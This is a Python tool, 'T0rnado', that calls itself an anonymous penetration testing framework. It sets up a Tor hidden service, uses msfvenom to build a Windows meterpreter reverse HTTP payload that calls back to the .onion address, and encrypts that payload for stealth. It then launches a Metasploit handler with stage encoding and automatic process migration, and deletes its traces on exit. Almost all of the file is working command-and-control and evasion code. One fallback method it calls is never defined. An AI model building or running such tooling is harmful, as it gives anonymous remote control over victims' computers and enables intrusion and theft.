#!/usr/bin/env python3
# T0rnado - Advanced Anonymous Penetration Testing Framework

import os
import signal
import subprocess
import sys
import argparse
import random
import string
import time
import hashlib
import base64
from pathlib import Path
from cryptography.fernet import Fernet

try:
    from stem.control import Controller
except ImportError:
    print("[-] Stem module not installed. Run: pip install stem")
    sys.exit(1)

try:
    from importlib.metadata import version
except ImportError:
    from importlib_metadata import version

class AdvancedLogger:
    """Stealthy logging with multiple output methods"""
    
    COLORS = {
        'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
        'BLUE': '\033[94m', 'MAGENTA': '\033[95m', 'CYAN': '\033[96m',
        'WHITE': '\033[97m', 'RESET': '\033[0m'
    }
    
    @staticmethod
    def log(message, level='info'):
        levels = {
            'info': ('[*]', 'BLUE'),
            'success': ('[+]', 'GREEN'),
            'warning': ('[!]', 'YELLOW'),
            'error': ('[-]', 'RED'),
            'debug': ('[D]', 'MAGENTA')
        }
        
        prefix, color = levels.get(level, ('[*]', 'BLUE'))
        timestamp = time.strftime("%H:%M:%S")
        print(f"{AdvancedLogger.COLORS[color]}{timestamp}{prefix}{AdvancedLogger.COLORS['RESET']} {message}")

class StealthTorController:
    """Advanced Tor control with multiple fallback methods"""
    
    def __init__(self):
        self.controller = None
        self.password = self.generate_secure_password()
        
    def generate_secure_password(self):
        return hashlib.sha256(os.urandom(64)).hexdigest()[:32]
    
    def start_tor_service(self):
        """Start Tor with multiple methods"""
        methods = [
            self._start_system_tor,
            self._start_standalone_tor,
            self._start_tor_binary
        ]
        
        for method in methods:
            if method():
                return True
        return False
    
    def _start_system_tor(self):
        try:
            subprocess.run(['sudo', 'systemctl', 'start', 'tor'], check=True, capture_output=True)
            time.sleep(3)
            return True
        except:
            return False
    
    def _start_standalone_tor(self):
        try:
            tor_process = subprocess.Popen(['tor', '--runasdaemon', '1'], 
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)
            return tor_process.poll() is None
        except:
            return False

class PayloadGenerator:
    """Advanced payload generation with multiple formats and obfuscation"""
    
    def __init__(self):
        self.supported_formats = ['raw', 'exe', 'dll', 'ps1', 'elf']
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
    
    def generate_metasploit_payload(self, lhost, lport, arch='x64', format='raw'):
        """Generate payload with multiple evasion techniques"""
        
        payloads = {
            'x64': f'windows/x64/meterpreter_reverse_http',
            'x86': f'windows/meterpreter_reverse_http'
        }
        
        if arch not in ['x64', 'x86']:
            arch = 'x64'
        
        # Randomize payload name
        payload_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        cmd = [
            'msfvenom',
            '-p', payloads[arch],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            'EXITFUNC=thread',
            '--platform', 'windows',
            '-a', arch,
            '-f', format,
            '-o', f'tornado_{payload_name}.{format}'
        ]
        
        try:
            AdvancedLogger.log(f"Generating {arch} payload...", 'info')
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return f'tornado_{payload_name}.{format}'
            else:
                AdvancedLogger.log("Payload generation failed", 'error')
                return None
                
        except subprocess.TimeoutExpired:
            AdvancedLogger.log("Payload generation timed out", 'error')
            return None
    
    def encrypt_payload(self, payload_path):
        """Encrypt payload for additional stealth"""
        try:
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            encrypted_data = self.cipher.encrypt(payload_data)
            
            encrypted_path = f"{payload_path}.enc"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            return encrypted_path
        except Exception as e:
            AdvancedLogger.log(f"Encryption failed: {e}", 'error')
            return payload_path

class T0rnadoAdvanced:
    def __init__(self):
        self.version = "2.0.0"
        self.author = "samet-g"
        self.tor_controller = StealthTorController()
        self.payload_gen = PayloadGenerator()
        self.hidden_service_dir = Path("/var/lib/tor/hidden_service/")
        
    def display_banner(self):
        banner = f"""
{AdvancedLogger.COLORS['CYAN']}
████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ 
╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
   ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ 
                                                              
{AdvancedLogger.COLORS['RESET']}
        Version: {self.version} | Author: {self.author}
        Advanced Anonymous Penetration Testing Framework
        """
        print(banner)
    
    def check_privileges(self):
        if os.geteuid() != 0:
            AdvancedLogger.log("Root privileges required", 'error')
            return False
        return True
    
    def install_dependencies(self):
        """Install required dependencies with multiple package managers"""
        AdvancedLogger.log("Checking dependencies...", 'info')
        
        dependencies = {
            'tor': ['sudo apt install tor -y', 'sudo yum install tor -y'],
            'msfvenom': ['sudo apt install metasploit-framework -y', 'sudo yum install metasploit-framework -y'],
            'python3-stem': ['sudo apt install python3-stem -y', 'pip install stem']
        }
        
        for dep, commands in dependencies.items():
            if not self._check_dependency(dep):
                AdvancedLogger.log(f"Installing {dep}...", 'warning')
                for cmd in commands:
                    try:
                        subprocess.run(cmd.split(), check=True, capture_output=True)
                        if self._check_dependency(dep):
                            AdvancedLogger.log(f"{dep} installed successfully", 'success')
                            break
                    except:
                        continue
                else:
                    AdvancedLogger.log(f"Failed to install {dep}", 'error')
                    return False
        
        return True
    
    def _check_dependency(self, dep):
        try:
            if dep == 'msfvenom':
                return subprocess.run(['which', 'msfvenom'], capture_output=True).returncode == 0
            else:
                return subprocess.run(['which', dep], capture_output=True).returncode == 0
        except:
            return False
    
    def configure_tor(self):
        """Advanced Tor configuration with multiple fallbacks"""
        AdvancedLogger.log("Configuring Tor service...", 'info')
        
        try:
            # Backup original config
            subprocess.run(['cp', '/etc/tor/torrc', '/etc/tor/torrc.backup'], check=True)
            
            # Create optimized torrc
            tor_config = f"""
SocksPort 9050
ControlPort 9051
HashedControlPassword {self.tor_controller.password}
DataDirectory /var/lib/tor
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
Log notice file /var/log/tor/notices.log
CircuitBuildTimeout 10
KeepalivePeriod 60
NewCircuitPeriod 15
NumEntryGuards 8
UseEntryGuards 1
StrictNodes 1
            """
            
            with open('/etc/tor/torrc', 'w') as f:
                f.write(tor_config)
            
            # Ensure proper permissions
            subprocess.run(['chown', '-R', 'debian-tor:debian-tor', '/var/lib/tor'], check=True)
            subprocess.run(['chmod', '700', '/var/lib/tor/hidden_service'], check=True)
            
            return True
            
        except Exception as e:
            AdvancedLogger.log(f"Tor configuration failed: {e}", 'error')
            return False
    
    def create_hidden_service(self):
        """Create hidden service with advanced options"""
        try:
            AdvancedLogger.log("Creating hidden service...", 'info')
            
            with Controller.from_port(port=9051) as controller:
                controller.authenticate(password=self.tor_controller.password)
                
                # Create hidden service
                service = controller.create_ephemeral_hidden_service(
                    {80: 8080},
                    key_type='NEW',
                    key_content='ED25519-V3',
                    await_publication=True
                )
                
                AdvancedLogger.log(f"Hidden service created: {service.service_id}.onion", 'success')
                return service.service_id
                
        except Exception as e:
            AdvancedLogger.log(f"Hidden service creation failed: {e}", 'error')
            return None
    
    def generate_payload(self, onion_host):
        """Generate advanced payload with user interaction"""
        AdvancedLogger.log("Payload configuration", 'info')
        
        print(f"\n{AdvancedLogger.COLORS['YELLOW']}[*] Target: {onion_host}.onion:80{AdvancedLogger.COLORS['RESET']}")
        
        arch = input(f"{AdvancedLogger.COLORS['BLUE']}[?] Architecture (x86/x64) [x64]: {AdvancedLogger.COLORS['RESET']}") or "x64"
        format = input(f"{AdvancedLogger.COLORS['BLUE']}[?] Format (raw/exe/dll/ps1) [raw]: {AdvancedLogger.COLORS['RESET']}") or "raw"
        
        payload_file = self.payload_gen.generate_metasploit_payload(
            f"{onion_host}.onion", 80, arch, format
        )
        
        if payload_file:
            encrypted_payload = self.payload_gen.encrypt_payload(payload_file)
            AdvancedLogger.log(f"Payload generated: {encrypted_payload}", 'success')
            return encrypted_payload
        
        return None
    
    def start_handler(self, onion_host):
        """Start Metasploit handler automatically"""
        handler_script = f"""
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_http
set LHOST 0.0.0.0
set LPORT 8080
set ReverseListenerBindAddress 127.0.0.1
set ExitOnSession false
set AutoRunScript migrate -f
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
set StageEncodingFallback false
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
set HttpHostHeader {onion_host}.onion
exploit -j
        """
        
        handler_file = "/tmp/tornado_handler.rc"
        with open(handler_file, 'w') as f:
            f.write(handler_script)
        
        AdvancedLogger.log("Starting Metasploit handler...", 'info')
        subprocess.Popen(['msfconsole', '-r', handler_file])
    
    def cleanup(self):
        """Cleanup traces and temporary files"""
        AdvancedLogger.log("Cleaning up temporary files...", 'info')
        
        temp_files = [
            '/tmp/tornado_handler.rc',
            'tornado_*.raw',
            'tornado_*.enc',
            'tornado_*.exe',
            'tornado_*.dll',
            'tornado_*.ps1'
        ]
        
        for pattern in temp_files:
            for file in Path('.').glob(pattern):
                try:
                    file.unlink()
                except:
                    pass
    
    def run(self):
        """Main execution flow"""
        try:
            self.display_banner()
            
            if not self.check_privileges():
                sys.exit(1)
            
            if not self.install_dependencies():
                AdvancedLogger.log("Dependency installation failed", 'error')
                sys.exit(1)
            
            if not self.configure_tor():
                AdvancedLogger.log("Tor configuration failed", 'error')
                sys.exit(1)
            
            if not self.tor_controller.start_tor_service():
                AdvancedLogger.log("Tor service startup failed", 'error')
                sys.exit(1)
            
            onion_host = self.create_hidden_service()
            if not onion_host:
                sys.exit(1)
            
            payload = self.generate_payload(onion_host)
            if not payload:
                AdvancedLogger.log("Payload generation failed", 'error')
                sys.exit(1)
            
            self.start_handler(onion_host)
            
            AdvancedLogger.log("Setup complete! Waiting for connections...", 'success')
            AdvancedLogger.log(f"Onion URL: http://{onion_host}.onion", 'success')
            AdvancedLogger.log(f"Payload: {payload}", 'success')
            AdvancedLogger.log("Press Ctrl+C to stop", 'warning')
            
            # Keep running
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            AdvancedLogger.log("Shutting down...", 'warning')
        except Exception as e:
            AdvancedLogger.log(f"Unexpected error: {e}", 'error')
        finally:
            self.cleanup()

def main():
    parser = argparse.ArgumentParser(description='T0rnado Advanced - Anonymous Penetration Testing Framework')
    parser.add_argument('-start', '--start', action='store_true', help='Start T0rnado framework')
    parser.add_argument('-v', '--version', action='store_true', help='Show version information')
    
    args = parser.parse_args()
    
    if args.version:
        print("T0rnado Advanced v2.0.0")
        sys.exit(0)
    
    if args.start:
        tornado = T0rnadoAdvanced()
        tornado.run()
    else:
        parser.print_help()

if __name__ == '__main__':
    main()